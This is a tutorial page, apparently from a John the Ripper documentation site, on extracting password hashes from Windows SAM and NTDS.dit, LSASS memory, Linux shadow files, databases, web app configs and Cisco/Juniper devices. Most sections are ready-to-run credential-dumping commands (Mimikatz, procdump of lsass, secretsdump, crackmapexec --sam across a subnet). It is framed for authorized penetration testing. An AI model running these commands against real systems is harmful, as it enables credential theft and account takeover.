---
title: "Exploitation: Extracting Password Hashes"
description: "Learn techniques for extracting password hashes from various systems for password cracking with John the Ripper"
---

import { Accordion, AccordionItem, AccordionContent, AccordionTrigger } from "@/components/ui/accordion"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Steps, Step } from "@/components/markdown/steps"
import { Note } from "@/components/markdown/note"
import { Callout } from "@/components/markdown/callout"

# Exploitation: Extracting Password Hashes

The exploitation phase in password cracking focuses on extracting password hashes from target systems. This is a critical step that bridges the gap between identifying vulnerabilities and actually cracking passwords. This guide covers techniques for extracting password hashes from various systems and preparing them for cracking with John the Ripper.


## Windows Password Hash Extraction

<Tabs defaultValue="sam" className="pt-5 pb-1">
  <TabsList>
    <TabsTrigger value="sam">SAM Database</TabsTrigger>
    <TabsTrigger value="ntds">NTDS.dit</TabsTrigger>
    <TabsTrigger value="memory">Memory Dumps</TabsTrigger>
    <TabsTrigger value="registry">Registry Hives</TabsTrigger>
  </TabsList>
  <TabsContent value="sam">
    ### Extracting from SAM Database
    
    The Security Account Manager (SAM) database stores local user account information including password hashes.
    
    #### Using reg.exe (requires Administrator privileges)
    
    ```bash
    # Save the SAM and SYSTEM hives
    reg save HKLM\SAM sam.save
    reg save HKLM\SYSTEM system.save
    ```
    
    #### Using secretsdump.py from Impacket
    
    ```bash
    # Extract hashes from the saved files
    secretsdump.py -sam sam.save -system system.save LOCAL
    ```
    
    #### Using John the Ripper's built-in tools
    
    ```bash
    # Convert the SAM and SYSTEM files to John format
    pwdump sam.save system.save > hashes.txt
    
    # Alternatively, use the built-in script
    run/pwdump.py sam.save system.save > hashes.txt
    ```
    
    The extracted hashes will be in the format `username:RID:LM hash:NT hash:::` which is directly compatible with John the Ripper.
  </TabsContent>
  <TabsContent value="ntds">
    ### Extracting from NTDS.dit
    
    The NTDS.dit file contains all Active Directory user account information including password hashes.
    
    #### Using ntdsutil (requires Domain Admin privileges)
    
    ```bash
    # Create a snapshot of the NTDS.dit file
    ntdsutil "activate instance ntds" "ifm" "create full c:\temp\ntdsextract" quit quit
    ```
    
    #### Using secretsdump.py from Impacket
    
    ```bash
    # Extract hashes from the NTDS.dit file
    secretsdump.py -ntds ntds.dit -system system.save LOCAL
    ```
    
    #### Using DSInternals PowerShell Module
    
    ```powershell
    # Import the module
    Import-Module DSInternals
    
    # Extract hashes from the NTDS.dit file
    $bootKey = Get-BootKey -SystemHivePath "C:\temp\ntdsextract\registry\SYSTEM"
    Get-ADDBAccount -All -DBPath "C:\temp\ntdsextract\Active Directory\ntds.dit" -BootKey $bootKey | Format-Custom
    ```
    
    The extracted hashes can be saved to a file and used with John the Ripper.
  </TabsContent>
  <TabsContent value="memory">
    ### Extracting from Memory Dumps
    
    Memory dumps can contain plaintext passwords and password hashes from the LSASS process.
    
    #### Using Mimikatz
    
    ```bash
    # Dump credentials from memory
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
    ```
    
    #### Using Windows Task Manager
    
    1. Open Task Manager
    2. Find lsass.exe process
    3. Right-click and select "Create dump file"
    4. Use Mimikatz offline to extract hashes:
    
    ```bash
    # Process the memory dump offline
    mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
    ```
    
    #### Using Procdump
    
    ```bash
    # Dump the LSASS process
    procdump.exe -ma lsass.exe lsass.dmp
    ```
    
    Extract the NTLM hashes from the output and save them in a format compatible with John the Ripper.
  </TabsContent>
  <TabsContent value="registry">
    ### Extracting from Registry Hives
    
    Registry hives can be accessed offline to extract password hashes.
    
    #### Using reg.exe to save hives
    
    ```bash
    # Export registry hives
    reg save HKLM\SAM C:\temp\sam.save
    reg save HKLM\SYSTEM C:\temp\system.save
    reg save HKLM\SECURITY C:\temp\security.save
    ```
    
    #### Using CrackMapExec
    
    ```bash
    # Extract hashes using CrackMapExec
    crackmapexec smb 192.168.1.100 -u Administrator -p Password123 --sam
    ```
    
    #### Using PowerShell and DSInternals
    
    ```powershell
    # Extract cached credentials
    $key = Get-BootKey -SystemHivePath "C:\temp\system.save"
    Get-SamHashes -SamHivePath "C:\temp\sam.save" -BootKey $key
    ```
    
    Save the output to a file for use with John the Ripper.
  </TabsContent>
</Tabs>

## Linux/Unix Password Hash Extraction

<div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
  <Card>
    <CardHeader>
      <CardTitle>Shadow File Extraction</CardTitle>
    </CardHeader>
    <CardContent>
      The /etc/shadow file contains user password hashes on Linux/Unix systems.
      
      ```bash
      # Direct copy (requires root)
      sudo cp /etc/shadow /tmp/shadow_copy
      
      # Using cat (requires root)
      sudo cat /etc/shadow > /tmp/shadow_copy
      
      # Using John's unshadow tool
      sudo unshadow /etc/passwd /etc/shadow > /tmp/passwords.txt
      ```
      
      The unshadow tool combines information from both files into a format that John the Ripper can use directly.
    </CardContent>
  </Card>
  
  <Card>
    <CardHeader>
      <CardTitle>Hash Format Conversion</CardTitle>
    </CardHeader>
    <CardContent>
      Convert extracted hashes to formats compatible with John the Ripper:
      
      ```bash
      # For shadow file
      sudo unshadow /etc/passwd /etc/shadow > unshadowed.txt
      
      # For specific hash types
      grep -v '^#' /etc/shadow | cut -d: -f1,2 > shadow_hashes.txt
      
      # For specific users
      grep "username" /etc/shadow | cut -d: -f1,2 > user_hash.txt
      ```
      
      John the Ripper can automatically detect most hash types from the shadow file format.
    </CardContent>
  </Card>
</div>

### Extracting from Linux Memory

<Steps>
  <Step title="Dump process memory">
    Use memory forensics tools to extract credentials from memory:
    
    ```bash
    # Using gcore to dump process memory
    sudo gcore -o auth_dump $(pgrep sshd)
    
    # Using GDB
    sudo gdb -p $(pgrep pam) -ex "generate-core-file /tmp/pam_core" -ex "quit"
    ```
    
    These commands create memory dumps of authentication-related processes.
  </Step>
  
  <Step title="Extract strings from memory dumps">
    Search for password hashes or plaintext credentials:
    
    ```bash
    # Search for shadow file format patterns
    strings auth_dump | grep -E '\$[1-9]\$'
    
    # Search for common password patterns
    strings auth_dump | grep -E 'password|passwd|pwd'
    ```
    
    This may reveal credentials cached in memory.
  </Step>
  
  <Step title="Use specialized tools">
    Several tools can extract credentials from memory:
    
    ```bash
    # Using Mimipenguin
    sudo python3 mimipenguin.py
    
    # Using LaZagne
    sudo python3 laZagne.py all
    ```
    
    These tools are designed to extract credentials from memory on Linux systems.
  </Step>
</Steps>

## Database Password Hash Extraction

<Accordion type="single" collapsible>
  <AccordionItem value="mysql">
    <AccordionTrigger>MySQL/MariaDB</AccordionTrigger>
    <AccordionContent>
      ### MySQL/MariaDB Hash Extraction
      
      Extract password hashes from MySQL user tables:
      
      ```sql
      -- With admin access, extract user hashes
      SELECT user, host, authentication_string FROM mysql.user;
      ```
      
      Save the output to a file and format it for John the Ripper:
      
      ```bash
      # Format: username:hash
      echo "dbuser:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B" > mysql_hashes.txt
      
      # Use John with the mysql-sha1 format
      john --format=mysql-sha1 mysql_hashes.txt
      ```
      
      For MySQL 8.0+ with caching_sha2_password, use the mysql-sha256 format.
    </AccordionContent>
  </AccordionItem>
  
  <AccordionItem value="mssql">
    <AccordionTrigger>Microsoft SQL Server</AccordionTrigger>
    <AccordionContent>
      ### Microsoft SQL Server Hash Extraction
      
      Extract password hashes from SQL Server:
      
      ```sql
      -- With sysadmin privileges
      SELECT name, password_hash FROM sys.sql_logins;
      ```
      
      Format the output for John the Ripper:
      
      ```bash
      # For SQL Server 2005+
      echo "sa:0x0200106704030A545B51075F5477531268457C55544A4C5447" > mssql_hashes.txt
      
      # Use John with the mssql05 format
      john --format=mssql05 mssql_hashes.txt
      
      # For SQL Server 2012+, use mssql12 format
      john --format=mssql12 mssql_hashes.txt
      ```
    </AccordionContent>
  </AccordionItem>
  
  <AccordionItem value="oracle">
    <AccordionTrigger>Oracle Database</AccordionTrigger>
    <AccordionContent>
      ### Oracle Database Hash Extraction
      
      Extract password hashes from Oracle:
      
      ```sql
      -- With DBA privileges
      SELECT name, password, spare4 FROM sys.user$;
      ```
      
      Format the output for John the Ripper:
      
      ```bash
      # For Oracle 11g
      echo "SYSTEM:S:5A7270612B49A31D36BFC5C9B2564A4A5F4:" > oracle_hashes.txt
      
      # Use John with the oracle11 format
      john --format=oracle11 oracle_hashes.txt
      
      # For Oracle 12c+, use oracle12c format
      john --format=oracle12c oracle_hashes.txt
      ```
    </AccordionContent>
  </AccordionItem>
  
  <AccordionItem value="postgres">
    <AccordionTrigger>PostgreSQL</AccordionTrigger>
    <AccordionContent>
      ### PostgreSQL Hash Extraction
      
      Extract password hashes from PostgreSQL:
      
      ```sql
      -- With superuser privileges
      SELECT rolname, rolpassword FROM pg_authid;
      ```
      
      Format the output for John the Ripper:
      
      ```bash
      # Format: username:hash
      echo "postgres:md5a8b2c77dfb55fe5d1a060ce6b4e4db4a" > postgres_hashes.txt
      
      # Use John with the postgres format
      john --format=postgres postgres_hashes.txt
      ```
      
      For PostgreSQL 10+ with SCRAM-SHA-256, additional processing may be required.
    </AccordionContent>
  </AccordionItem>
</Accordion>

## Web Application Password Hash Extraction

<Tabs defaultValue="config" className="pt-5 pb-1">
  <TabsList>
    <TabsTrigger value="config">Configuration Files</TabsTrigger>
    <TabsTrigger value="database">Database Access</TabsTrigger>
    <TabsTrigger value="source">Source Code Analysis</TabsTrigger>
  </TabsList>
  <TabsContent value="config">
    ### Extracting from Configuration Files
    
    Web applications often store database credentials in configuration files:
    
    #### PHP Applications
    
    ```bash
    # Search for common config files
    find /var/www/ -name "config.php" -o -name "wp-config.php" -o -name "settings.php"
    
    # Extract database credentials
    grep -E "password|passwd|pwd" /var/www/html/config.php
    ```
    
    #### .NET Applications
    
    ```bash
    # Search for web.config files
    find /var/www/ -name "web.config"
    
    # Extract connection strings
    grep -A 3 "connectionString" /var/www/site/web.config
    ```
    
    #### Java Applications
    
    ```bash
    # Search for properties files
    find /var/www/ -name "*.properties" -o -name "application.yml"
    
    # Extract credentials
    grep -E "password|passwd|pwd" /var/www/app/application.properties
    ```
    
    Use these credentials to access the database and extract password hashes.
  </TabsContent>
  <TabsContent value="database">
    ### Extracting from Application Databases
    
    Once you have database credentials, extract user password hashes:
    
    #### WordPress Example
    
    ```sql
    -- Connect to WordPress database
    SELECT ID, user_login, user_pass FROM wp_users;
    ```
    
    #### Drupal Example
    
    ```sql
    -- Connect to Drupal database
    SELECT uid, name, pass FROM users;
    ```
    
    #### Custom Applications
    
    ```bash
    # Identify tables containing user data
    mysql -u dbuser -p -e "SHOW TABLES" dbname
    
    # Look for tables with user/password columns
    mysql -u dbuser -p -e "DESCRIBE users" dbname
    
    # Extract hashes
    mysql -u dbuser -p -e "SELECT username, password FROM users" dbname > hashes.txt
    ```
    
    Format the extracted hashes according to the application's hashing algorithm for use with John the Ripper.
  </TabsContent>
  <TabsContent value="source">
    ### Source Code Analysis for Hash Formats
    
    Analyze source code to determine hash formats:
    
    #### PHP Example
    
    ```bash
    # Search for password hashing functions
    grep -r "password_hash" /var/www/html/
    grep -r "md5(" /var/www/html/
    grep -r "hash(" /var/www/html/
    ```
    
    #### Java Example
    
    ```bash
    # Search for hashing implementations
    grep -r "MessageDigest" /var/www/app/
    grep -r "BCrypt" /var/www/app/
    ```
    
    #### JavaScript/Node.js Example
    
    ```bash
    # Search for hashing libraries
    grep -r "bcrypt" /var/www/app/
    grep -r "crypto.createHash" /var/www/app/
    ```
    
    Understanding the hash format is crucial for configuring John the Ripper correctly.
  </TabsContent>
</Tabs>

## Network Device Password Hash Extraction

<div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
  <Card>
    <CardHeader>
      <CardTitle>Cisco Devices</CardTitle>
    </CardHeader>
    <CardContent>
      Extract password hashes from Cisco devices:
      
      ```
      # Show running configuration
      show running-config
      
      # Look for lines like:
      enable secret 5 $1$mERr$hx5rVt7rPNoS4wqbXKX7m0
      username admin privilege 15 secret 5 $1$mERr$hx5rVt7rPNoS4wqbXKX7m0
      ```
      
      Format for John the Ripper:
      
      ```bash
      # For type 5 passwords (MD5)
      echo "admin:$1$mERr$hx5rVt7rPNoS4wqbXKX7m0" > cisco_hashes.txt
      
      # Use John with the md5crypt format
      john --format=md5crypt cisco_hashes.txt
      ```
      
      For type 8 (PBKDF2) and type 9 (scrypt) hashes, use appropriate formats.
    </CardContent>
  </Card>
  
  <Card>
    <CardHeader>
      <CardTitle>Juniper Devices</CardTitle>
    </CardHeader>
    <CardContent>
      Extract password hashes from Juniper devices:
      
      ```
      # Show configuration
      show configuration | display set | match encrypted-password
      
      # Look for lines like:
      set system root-authentication encrypted-password "$1$rhyKTjKM$EJl4xnwrP.KGK/0QY0wYv0"
      ```
      
      Format for John the Ripper:
      
      ```bash
      # For MD5 hashes
      echo "root:$1$rhyKTjKM$EJl4xnwrP.KGK/0QY0wYv0" > juniper_hashes.txt
      
      # Use John with the md5crypt format
      john --format=md5crypt juniper_hashes.txt
      ```
      
      For SHA-256 and SHA-512 hashes, use the appropriate formats.
    </CardContent>
  </Card>
</div>

### Other Network Devices

<Steps>
  <Step title="Extract configuration">
    Access the device configuration through:
    
    - Console access
    - SSH/Telnet access
    - TFTP backup
    - SNMP configuration download
    
    ```bash
    # Using SNMP to download config (if enabled)
    snmpwalk -c community -v2c 192.168.1.1 .1.3.6.1.4.1.9.9.96.1.1.1.1.2
    ```
  </Step>
  
  <Step title="Identify hash formats">
    Different devices use different hash formats:
    
    - Cisco: Type 5 (MD5), Type 8 (PBKDF2), Type 9 (scrypt)
    - Juniper: $1$ (MD5), $5$ (SHA-256), $6$ (SHA-512)
    - Fortinet: Proprietary format
    - Mikrotik: MD5 or SHA-256
    
    Identify the format based on the prefix or documentation.
  </Step>
  
  <Step title="Format for John the Ripper">
    Prepare the hashes for cracking:
    
    ```bash
    # General format
    echo "username:hash" > network_hashes.txt
    
    # Use appropriate format flag
    john --format=md5crypt network_hashes.txt  # For Cisco Type 5
    john --format=sha256crypt network_hashes.txt  # For SHA-256 hashes
    ```
    
    Some proprietary formats may require custom rules or formats.
  </Step>
</Steps>

## Preparing Hashes for John the Ripper

<Tabs defaultValue="format" className="pt-5 pb-1">
  <TabsList>
    <TabsTrigger value="format">Format Conversion</TabsTrigger>
    <TabsTrigger value="cleanup">Hash Cleanup</TabsTrigger>
    <TabsTrigger value="custom">Custom Formats</TabsTrigger>
  </TabsList>
  <TabsContent value="format">
    ### Converting Hashes to John Format
    
    John the Ripper expects hashes in specific formats:
    
    #### Windows Hashes
    
    ```bash
    # Convert Windows hashes to John format
    python3 john/run/pwdump2john.py windows_dump.txt > john_windows_hashes.txt
    
    # For NTDS dumps
    python3 john/run/secretsdump2john.py ntds_dump.txt > john_ntds_hashes.txt
    ```
    
    #### Linux/Unix Hashes
    
    ```bash
    # Combine passwd and shadow files
    unshadow /etc/passwd /etc/shadow > john_linux_hashes.txt
    ```
    
    #### Database Hashes
    
    ```bash
    # Convert MySQL hashes
    python3 john/run/mysql_to_john.py mysql_dump.txt > john_mysql_hashes.txt
    
    # Convert Oracle hashes
    python3 john/run/oracle2john.py oracle_dump.txt > john_oracle_hashes.txt
    ```
    
    John includes many conversion scripts in the `run/` directory.
  </TabsContent>
  <TabsContent value="cleanup">
    ### Cleaning Up Hash Files
    
    Clean up hash files for better performance:
    
    ```bash
    # Remove duplicate hashes
    sort -u original_hashes.txt > unique_hashes.txt
    
    # Remove unnecessary information
    grep -v '^#' hashes.txt | grep -v '^$' > cleaned_hashes.txt
    
    # Extract only username:hash pairs
    cut -d: -f1,2 full_dump.txt > username_hash_pairs.txt
    ```
    
    Clean hash files improve cracking efficiency.
  </TabsContent>
  <TabsContent value="custom">
    ### Handling Custom Hash Formats
    
    For non-standard hash formats:
    
    ```bash
    # Create a custom format file
    echo "username:$custom_hash_format$salt$hash" > custom_hashes.txt
    
    # Use John's --format option
    john --format=custom-md5 custom_hashes.txt
    
    # For completely custom formats, create a dynamic format
    john --list=subformats | grep dynamic
    john --format=dynamic='$dynamic_1$hash$salt' custom_hashes.txt
    ```
    
    John the Ripper supports many dynamic formats for custom hash types.
  </TabsContent>
</Tabs>

## Hash Extraction Tools

<div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
  <Card>
    <CardHeader>
      <CardTitle>Built-in John the Ripper Tools</CardTitle>
    </CardHeader>
    <CardContent>
      John the Ripper includes many extraction and conversion tools:
      
      - **unshadow**: Combines passwd and shadow files
      - **zip2john**: Extracts hashes from password-protected ZIP files
      - **pdf2john**: Extracts hashes from password-protected PDF files
      - **office2john**: Extracts hashes from MS Office documents
      - **ssh2john**: Extracts hashes from SSH private keys
      
      ```bash
      # Example usage
      ./run/zip2john protected.zip > zip_hash.txt
      ./run/pdf2john document.pdf > pdf_hash.txt
      ./run/ssh2john id_rsa > ssh_hash.txt
      ```
      
      These tools create output in formats ready for John the Ripper.
    </CardContent>
  </Card>
  
  <Card>
    <CardHeader>
      <CardTitle>Third-Party Extraction Tools</CardTitle>
    </CardHeader>
    <CardContent>
      Several third-party tools complement John the Ripper:
      
      - **Mimikatz**: Windows credential extraction
      - **Hashcat Utils**: Hash manipulation tools
      - **CrackMapExec**: Network credential harvesting
      - **Impacket**: Windows hash extraction tools
      - **LaZagne**: Credential recovery tool
      
      ```bash
      # Example with CrackMapExec
      crackmapexec smb 192.168.1.0/24 -u administrator -p password --sam
      
      # Example with Impacket's secretsdump
      secretsdump.py domain/user:password@192.168.1.100
      ```
      
      These tools can extract hashes from various sources.
    </CardContent>
  </Card>
</div>

## Legal and Ethical Considerations


### Documentation and Chain of Custody

<Steps>
  <Step title="Document authorization">
    Always maintain proper documentation:
    
    - Written authorization from system owner
    - Scope of the assessment
    - Specific systems authorized for testing
    - Time frame for testing activities
  </Step>
  
  <Step title="Maintain chain of custody">
    Protect extracted password data:
    
    - Store hashes in encrypted containers
    - Limit access to authorized personnel only
    - Delete data when no longer needed
    - Document all handling of password data
  </Step>
  
  <Step title="Report findings responsibly">
    Follow responsible disclosure practices:
    
    - Report vulnerabilities to system owners
    - Provide clear remediation guidance
    - Do not share credentials or hashes publicly
    - Follow the organization's security policies
  </Step>
</Steps>

<Note title="Professional Tip">
  Always verify that your hash extraction methods are working correctly by testing them in a controlled environment first. This ensures you'll be able to extract hashes efficiently during actual assessments and reduces the risk of errors that might impact system stability.
</Note>

## Next Steps

Now that you understand how to extract password hashes from various systems, you can:

1. Learn about [password cracking strategies](/docs/john-the-ripper/post-exploitation) using John the Ripper
2. Explore [optimization best practices](/docs/john-the-ripper/optimization-best-practices) to improve cracking efficiency
3. Study [tool integration](/docs/john-the-ripper/tool-integration) to combine John with other security tools
